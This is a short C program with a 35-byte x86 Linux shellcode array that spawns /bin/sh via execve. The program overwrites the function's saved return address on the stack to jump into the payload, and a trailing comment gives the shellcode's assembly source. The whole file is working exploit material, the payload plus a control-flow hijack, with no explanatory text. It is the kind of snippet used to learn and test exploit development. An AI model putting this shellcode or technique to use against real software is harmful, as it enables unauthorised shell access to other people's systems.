
char payload[35] = "\x55\x89\xe5\xeb\x11\x5e\x8d\x1e\x31\xc9\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\x31\xdb\xb0\x01\xe8\xea\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00";

void shell() {
    int *ret;

    ret = (int *)&ret+2;

    (*ret) = (int)payload;
}

void main() {
    shell();
}

// shellcode below
/*
 *    [SECTION .text]
 *    global execve_do
 *    
 *    execve_do:
 *        push ebp
 *        mov ebp, esp
 *        jmp short $+0x13
 *        pop dword esi           ; get the sh_str address in esi
 *        lea ebx, [esi]
 *        xor ecx, ecx
 *        xor edx, edx
 *        xor eax, eax
 *        mov al, 0x0b
 *        int 0x80
 *        xor ebx, ebx
 *        mov al, 0x01            ; call exit
 *    
 *    sh_str:
 *        call execve_do + 5
 *        db '/bin/sh', 0
*/
